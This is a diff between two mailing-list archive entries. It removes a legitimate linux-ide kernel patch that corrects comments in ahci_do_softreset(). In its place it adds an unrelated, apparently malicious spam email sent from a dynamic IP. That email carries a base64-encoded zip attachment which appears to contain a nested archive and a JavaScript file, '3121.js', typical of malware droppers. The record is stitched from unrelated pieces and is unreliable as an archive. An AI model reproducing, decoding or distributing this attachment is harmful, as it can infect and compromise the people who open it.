@@ -1,50 +1,74 @@
-From: Minwoo Im <dn3108@gmail.com>
-Subject: [PATCH] libahci: wrong comments in ahci_do_softreset()
-Date: Sun, 11 Jun 2017 23:53:00 +0900
-Message-ID: <1497192780-7772-1-git-send-email-dn3108@gmail.com>
+From: <mitch_128@hotmail.com>
+Subject: (unknown)
+Date: Sun, 11 Jun 2017 16:35:17 -0000
+Message-ID: <149719891713.29697.13850740179402607880@saturn-internet.ru>
+Mime-Version: 1.0
+Content-Type: application/zip; name="689971074.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-ide-owner@vger.kernel.org>
-Received: from mail-pg0-f66.google.com ([74.125.83.66]:33916 "EHLO
-        mail-pg0-f66.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1751764AbdFKOxH (ORCPT
-        <rfc822;linux-ide@vger.kernel.org>); Sun, 11 Jun 2017 10:53:07 -0400
-Received: by mail-pg0-f66.google.com with SMTP id v14so12117575pgn.1
-        for <linux-ide@vger.kernel.org>; Sun, 11 Jun 2017 07:53:07 -0700 (PDT)
+Received: from 178.161.230.48.dyn.v4.saturn-internet.ru ([178.161.230.48]:55690
+        "HELO saturn-internet.ru" rhost-flags-OK-FAIL-OK-FAIL)
+        by vger.kernel.org with SMTP id S1751764AbdFKQfV (ORCPT
+        <rfc822;linux-ide@vger.kernel.org>); Sun, 11 Jun 2017 12:35:21 -0400
+Subject: 
+Content-Disposition: attachment
 Sender: linux-ide-owner@vger.kernel.org
 List-Id: linux-ide@vger.kernel.org
-To: Tejun Heo <tj@kernel.org>
-Cc: linux-ide@vger.kernel.org, Minwoo Im <dn3108@gmail.com>
+To: linux-ide@vger.kernel.org
 
-AHCI 1.3.1 Spec says that software shall build two H2D register
-FISes in the command list to send a software reset.
-The comments in ahci_do_softreset() is currently D2H instead of H2D.
-
-Signed-off-by: Minwoo Im <dn3108@gmail.com>
----
- drivers/ata/libahci.c |    4 ++--
- 1 file changed, 2 insertions(+), 2 deletions(-)
-
-diff --git a/drivers/ata/libahci.c b/drivers/ata/libahci.c
-index 3159f9e..835efe4 100644
---- a/drivers/ata/libahci.c
-+++ b/drivers/ata/libahci.c
-@@ -1400,7 +1400,7 @@ int ahci_do_softreset(struct ata_link *link, unsigned int *class,
- 
- 	ata_tf_init(link->device, &tf);
- 
--	/* issue the first D2H Register FIS */
-+	/* issue the first H2D Register FIS */
- 	msecs = 0;
- 	now = jiffies;
- 	if (time_after(deadline, now))
-@@ -1417,7 +1417,7 @@ int ahci_do_softreset(struct ata_link *link, unsigned int *class,
- 	/* spec says at least 5us, but be generous and sleep for 1ms */
- 	ata_msleep(ap, 1);
- 
--	/* issue the second D2H Register FIS */
-+	/* issue the second H2D Register FIS */
- 	tf.ctl &= ~ATA_SRST;
- 	ahci_exec_polled_cmd(ap, pmp, &tf, 0, 0, 0);
- 
--- 
-1.7.9.5
-
+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
